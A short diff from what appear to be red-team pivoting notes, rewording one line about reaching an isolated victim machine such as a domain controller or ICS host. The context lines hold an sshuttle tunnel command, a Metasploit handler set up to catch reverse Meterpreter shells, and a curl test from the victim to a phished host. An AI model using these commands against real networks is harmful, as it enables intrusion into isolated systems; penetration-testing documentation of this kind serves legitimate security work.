@@ -90,7 +90,7 @@ sshuttle -v -r user@sshGateway network/netmask -e 'ssh -i /path/to/private_key'
         #OR
         msfconsole -q -x "use exploit/multi/handler;set LPORT 3333; set LHOST eth0; set payload windows/x64/meterpreter/reverse_https;run -jz"
         ```
-    * Now on the isolated target/victim machine (without direct connection to your C2/Kali) like the DC or ICS.
+    * Now on the [INTERNET_ISOLATED_MACHINE]/target/victim (without direct connection to your C2/Kali) like the DC or ICS.
         * Test
             ```batch
             curl.exe PHISHEDVICTIM01.acme.local:3333
